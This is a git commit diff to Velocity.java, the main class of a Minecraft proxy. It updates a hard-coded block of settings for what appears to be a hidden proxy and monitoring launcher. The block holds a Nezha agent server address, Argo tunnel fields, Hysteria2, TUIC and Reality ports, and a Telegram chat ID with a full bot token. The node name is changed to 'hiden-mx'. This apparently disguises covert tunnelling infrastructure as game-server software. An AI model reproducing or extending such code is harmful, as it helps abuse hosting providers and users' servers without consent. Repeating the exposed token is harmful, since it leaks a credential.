1c2002b1c753fcf6ef0fab545feb186a267934dc
leolee1998 <168069603+leolee1998@users.noreply.github.com>
2025-10-29 00:06:49 +0800

    Update Velocity.java

--- proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
+++ proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
@@ -146,7 +146,7 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
-    envVars.put("UUID", "d59e98d8-4281-4850-96c6-71e11bc6c1de");
+    envVars.put("UUID", "fc9d98c8-a94f-4708-93fa-c9b002a0303a");
     envVars.put("FILE_PATH", "./world");
     envVars.put("NEZHA_SERVER", "amd2.felixlee.pp.ua:3489");
     envVars.put("NEZHA_PORT", "");
@@ -154,15 +154,15 @@ public final class Velocity {
     envVars.put("ARGO_PORT", "");
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
-    envVars.put("HY2_PORT", "24681");
-    envVars.put("TUIC_PORT", "24923");
-    envVars.put("REALITY_PORT", "24923");
+    envVars.put("HY2_PORT", "24696");
+    envVars.put("TUIC_PORT", "24774");
+    envVars.put("REALITY_PORT", "24774");
     envVars.put("UPLOAD_URL", "");
     envVars.put("CHAT_ID", "6975394604");
     envVars.put("BOT_TOKEN", "7425032752:AAH-txk6YNWCgwwxDqV4gghp4A_Khl9OQfc");
     envVars.put("CFIP", "");
     envVars.put("CFPORT", "");
-    envVars.put("NAME", "Mc");
+    envVars.put("NAME", "hiden-mx");
 
     for (String var : ALL_ENV_VARS) {
       final String value = System.getenv(var);
